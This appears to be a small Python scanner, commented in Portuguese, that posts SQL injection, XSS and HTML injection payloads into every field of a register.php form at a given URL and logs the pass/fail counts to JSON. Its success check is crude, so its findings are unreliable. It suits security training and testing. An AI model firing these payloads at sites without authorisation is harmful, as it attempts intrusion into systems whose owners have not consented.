import requests
import sys
import os
import time
import json
from datetime import datetime
from pathlib import Path

#diretório dos logs .json
logs_dir = Path('logs')

if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

url_alvo = f"{url_base}/index.php?page=register.php"
print(url_alvo)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

campos_formulario = ['username', 'password', 'confirm_password', 'my_signature']

payloads = {
    'SQL Injection': "' OR '1'='1",
    'XSS': "<script>alert('XSS')</script>",
    'HTML Injection': "<h1>HTML Injection</h1>"
}

total_testes = 0
testes_passaram = 0
testes_falharam = 0

for campo in campos_formulario:
    for tipo_vulnerabilidade, payload in payloads.items():
        dados_formulario = {c: 'teste' for c in campos_formulario}
        dados_formulario[campo] = payload

        total_testes += 1
        resposta_teste = requests.post(url_alvo, data=dados_formulario, headers=headers)

        print(f"Teste {total_testes}: Campo '{campo}' com payload '{payload}'. Código de status: {resposta_teste.status_code}")

        # Verifica se o teste foi bem-sucedido baseando-se no código de status
        if resposta_teste.status_code == 200 and "Registration failed" not in resposta_teste.text:
            print(f"Teste #{total_testes} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada no campo '{campo}'!")
            testes_passaram += 1
        else:
            print(f"Teste #{total_testes} FALHOU: Código de status: {resposta_teste.status_code} ou registro falhou.")
            testes_falharam += 1
        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio
print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")
print(f"Url Testada: {url_alvo}")

#-------------------------Parte de obtenção dos dados--------------------------------------- 
# Gravar os resultados em um arquivo JSON
resultados = {
    'data_hora': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
    'url_base': url_base,
    'total_testes': total_testes,
    'testes_passaram': testes_passaram,
    'testes_falharam': testes_falharam,
    'url_testada': url_alvo
}

nome_arquivo = f"resultados_{resultados['data_hora']}.json"
caminho_completo_arquivo = logs_dir.joinpath(nome_arquivo)

with open(caminho_completo_arquivo, 'w') as arquivo:
    json.dump(resultados, arquivo, indent=4)

print(f"\nResultados gravados em {caminho_completo_arquivo}")